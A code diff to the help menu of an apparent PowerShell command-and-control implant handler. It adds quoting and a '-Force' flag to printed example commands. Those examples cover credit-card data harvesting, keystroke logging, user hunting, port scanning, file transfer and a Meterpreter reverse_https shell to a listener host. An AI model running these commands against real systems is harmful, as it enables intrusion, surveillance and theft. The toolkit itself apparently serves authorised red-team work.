@@ -131,7 +131,7 @@ function Implant-Handler
         write-host " StartAnotherImplantWithProxy" -ForegroundColor Green 
         write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
         write-host " Get-MSHotfix|Where-Object {$_.Installedon -gt ((Get-Date).Adddays(-2))}|Select-Object -Property Computername, KBArticle,InstalledOn, HotFixID, InstalledBy|ft -autosize" -ForegroundColor Green 
-        write-host " Get-CreditCardData -Path C:\Backup\" -ForegroundColor Green
+        write-host " Get-CreditCardData -Path 'C:\Backup\'" -ForegroundColor Green
         write-host `n "Privilege Escalation: " -ForegroundColor Green
         write-host "====================" -ForegroundColor Red
         write-host " Invoke-AllChecks" -ForegroundColor Green
@@ -144,7 +144,7 @@ function Implant-Handler
         write-host `n "File Management: " -ForegroundColor Green
         write-host "====================" -ForegroundColor Red
         write-host " Download-File -Source 'C:\Temp Dir\Run.exe'" -ForegroundColor Green
-        write-host " Upload-File -Source C:\Temp\Run.exe -Destination C:\Temp\Test.exe" -ForegroundColor Green  
+        write-host " Upload-File -Source 'C:\Temp\Run.exe' -Destination 'C:\Temp\Test.exe'" -ForegroundColor Green  
         write-host " Web-Upload-File -From 'http://www.example.com/App.exe' -To 'C:\Temp\App.exe' " -ForegroundColor Green 
         write-host `n "Persistence: " -ForegroundColor Green
         write-host "================" -ForegroundColor Red
@@ -200,7 +200,7 @@ function Implant-Handler
         write-host ' Get-Keystrokes -LogPath "$($Env:TEMP)\key.log"' -ForegroundColor Green
         write-host " Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25" -ForegroundColor Green
         write-host " Invoke-UserHunter -StopOnSuccess" -ForegroundColor Green
-        write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443" -ForegroundColor Green
+        write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force" -ForegroundColor Green
         write-host `n "Implant Handler: " -ForegroundColor Green
         write-host "=====================" -ForegroundColor Red
         write-host " Back" -ForegroundColor Green 
